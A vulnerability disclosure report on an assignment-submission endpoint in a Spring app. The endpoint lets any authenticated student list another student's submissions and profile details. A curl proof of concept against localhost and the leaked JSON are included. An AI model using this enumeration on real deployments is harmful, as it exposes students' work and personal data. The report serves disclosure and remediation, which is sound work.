# [VRE-0005-submission-enumeration]

| Field | Value |
|---|---|
| VRE ID | VRE-0005 |
| Author | mataiodoxion |
| VRE | OCS VRE Team |
| Date | 2026-11-04 |
| Severity | Medium |
| Status | In Review |
| Affected Product | Spring |
| Affected Project | Assignments |


## Description

The endpoint for viewing submissions of a specific student is completely open to anybody with any level of authentication:
```java
// src/main/java/com/spring/mvc/assigments/AssignmentsApiController.java
/**
 * A GET endpoint to retrieve all submissions for a student.
 * @param studentId The ID of the student.
 * @return A list of all submissions for the student.
 * If the student is not found, returns a 404 error.
 * If the student has no submissions, returns an empty list.
 * If the student has submissions, returns a list of AssignmentSubmissionReturnDto objects.
 */
@Transactional
@GetMapping("/submissions/student/{studentId}")
public ResponseEntity<?> getSubmissions(@PathVariable Long studentId) {
    if (personRepo.findById(studentId).isEmpty()) {
        return ResponseEntity.status(HttpStatus.NOT_FOUND).body("Student not found");
    }

    List<AssignmentSubmissionReturnDto> dtos = Stream.concat(
        submissionRepo.findBySubmitterId(studentId).stream(),
        groupRepo.findGroupsByPersonId(studentId).stream()
            .flatMap(group -> submissionRepo.findBySubmitterId(group.getId()).stream())
    )
    .map(AssignmentSubmissionReturnDto::new)
    .toList();

    return ResponseEntity.ok(dtos);
}
```
Related `SecurityConfig.java`:
```java
// ========== ASSIGNMENT SUBMISSION ==========
// Submission authors must be authenticated before their personal AI keys can be used.
.requestMatchers(HttpMethod.POST, "/api/submissions/**").authenticated()
// Assignment file uploads - public (student identity passed in multipart fields)
.requestMatchers(HttpMethod.POST, "/api/assignment-submissions/upload").permitAll()
// ==========================================
```

## Impact

Submissions should only be viewable by teachers, admins, and student owners of the submission. Any authenticated user can enumerate any other user's submissions (which should likely be kept secret because they provide answers to assigments), and should be secured as such. This threat model is indicated in other similar endpoints that list submissions:
```java
// src/main/java/com/spring/mvc/assigments/AssignmentsApiController.java
/**
 * A GET endpoint to retrieve all submissions for the assignment.
 * @param assignmentId The ID of the assignment.
 * @return All submissions for the assignment.
 */
@Transactional
@GetMapping("/{assignmentId}/submissions")
public ResponseEntity<?> getSubmissions(@PathVariable Long assignmentId, @AuthenticationPrincipal UserDetails userDetails) {
    String uid = userDetails.getUsername();
    Person user = personRepo.findByUid(uid);

    if (user == null) {
        logger.error("User not found with email: {}", uid);
        throw new ResponseStatusException(HttpStatus.NOT_FOUND, "User not found with uid: " + uid);
    }

    Stream<AssignmentSubmission> submissions = submissionRepo.findByAssignmentId(assignmentId).stream();

    if (!(user.hasRoleWithName("ROLE_TEACHER") || user.hasRoleWithName("ROLE_ADMIN"))) {
        // if they aren't a teacher or admin, only let them see submissions they are assigned to grade
        submissions = submissions
            .filter(submission -> submission.getAssignedGraders().contains(user));
    }

    List<AssignmentSubmissionReturnDto> returnValue = submissions
        .map(AssignmentSubmissionReturnDto::new)
        .toList();

    return new ResponseEntity<>(returnValue, HttpStatus.OK);
}
```

## Proof of Concept (PoC)

As per the `grading.http` doc, as an admin user (`hop`) we can create a test assignment by sending a `POST` request to the endpoint `/api/assignments/test`, and we set the submission mode to link. The assignment I created was given an ID of `52`.
```curl
curl -X PUT 'http://localhost:8585/api/assignments/52/details' \
  --header 'User-Agent: yaak' \
  --header 'Accept: */*' \
  --header 'Cookie: <admin cookie>' \
  --header 'Content-Type: application/json' \
  --data '{
  "name": "[TEST] 20261105-090457",
  "type": "test",
  "points": 1,
  "dueDate": "11/12/2026",
  "assignmentType": "link",
  "description": "Created by api/grading.http"
}
'
```
Then, we create an assignment submission from the student user `hop`:
```curl
curl -X POST 'http://localhost:8585/api/submissions/submit/52' \
  --header 'User-Agent: yaak' \
  --header 'Accept: */*' \
  --header 'Content-Type: application/json' \
  --header 'Cookie: <hop cookie>' \
  --data '{
  "submitterId": 4,
  "isGroup": false,
  "content": { "type": "link", "url": "https://example.com/grading-http/v1", "notes": "" },
  "comment": "First try"
}'
```
As another authenticated student who is not `hop`, we can send a request to view the submissions of `hop` (ID `4`) as a different student user, `niko` (ID `7`):
```curl
curl -X GET 'http://localhost:8585/api/assignments/submissions/student/4' \
  --header 'User-Agent: yaak' \
  --header 'Accept: */*' \
  --header 'Content-Type: application/json' \
  --header 'Cookie: <niko cookie>' \
  --data ''
```


The returned data structure is the list of submissions from that user, including assigment details as well as `Person` object details:
```json
[
  {
    "id": 1,
    "assignment": {
      "id": 52,
      "name": "[TEST] 20261105-090457",
      "type": "test",
      "description": "Created by api/grading.http",
      "points": 1.0,
      "dueDate": "11/12/2026",
      "timestamp": "2026-11-05 09:04:57"
    },
    "submitter": {
      "id": 4,
      "email": "hop@example.com",
      "uid": "hop",
      "name": "Grace Hopper",
      "pfp": "/images/hop.png",
      "kasmServerNeeded": true,
      "sid": "0000003",
      "stats": {},
      "gradesJson": [],
      "roles": [
        {
          "id": 2,
          "name": "ROLE_USER"
        },
        {
          "id": 3,
          "name": "ROLE_STUDENT"
        }
      ],
      "banks": {
        "id": 4,
        "uid": "hop",
        "balance": 100000.0,
        "loanAmount": 0.0,
        "dailyInterestRate": 5.0,
        "riskCategory": 1,
        "profitMap": {},
        "featureImportance": {
          "loan_history": 0.2,
          "stock_activity": -0.3,
          "crypto_activity": -0.28,
          "profit_loss_ratio": 0.38,
          "recent_activity": 0.35,
          "balance_trend": 0.22,
          "volatility": 0.15,
          "casino_frequency": 0.42,
          "loan_balance_ratio": 0.25
        },
        "npcProgress": {
          "Stock-NPC": true,
          "Casino-NPC": false,
          "Fidelity": false,
          "Schwab": false,
          "Mining-NPC": false,
          "Crypto-NPC": false,
          "Bank-NPC": false
        },
        "username": "Grace Hopper",
        "riskCategoryString": "Medium Risk",
        "featureImportanceExplanations": [
          "Your loan repayment history slightly increases your interest rate",
          "Your stock market investments slightly decreases your interest rate",
          "Your cryptocurrency mining slightly decreases your interest rate",
          "Your gambling win/loss record significantly increases your interest rate",
          "Your recent gambling activity significantly increases your interest rate",
          "Your account balance history slightly increases your interest rate",
          "Your volatility slightly increases your interest rate",
          "Your casino gaming activity significantly increases your interest rate",
          "Your loan-to-balance ratio slightly increases your interest rate"
        ]
      }
    },
    "isGroup": false,
    "content": {
      "type": "link",
      "url": "https://example.com/grading-http/v1",
      "notes": ""
    },
    "comment": "First try",
    "grade": null,
    "feedback": null,
    "isLate": false,
    "aiSummary": null,
    "qualityScore": null,
    "grading": {
      "submissionId": 1,
      "revision": 1,
      "effectiveGrade": null,
      "effectiveFeedback": null,
      "gradedAt": null,
      "aiGrade": null,
      "aiFeedback": null,
      "qualityScore": null,
      "manualOverride": false,
      "manualGrade": null,
      "manualFeedback": null,
      "needsAiRegrade": false,
      "closedAt": null,
      "source": "NONE",
      "closed": false
    },
    "technicalExcellence": null,
    "communication": null,
    "workHabits": null,
    "aiOrchestration": null,
    "selfAssessmentReflection": null
  }
]
```

## Suggested Fix

The fix would be a simple implementation that has already been done for other endpoints. Just pass an `AuthenticationPrincipal` as a paramter and check if the user requesting the information is the owner of that submission, an admin, or a teacher.

## References 

This section intentionally left blank.

## Notes

This section intentionally left blank.


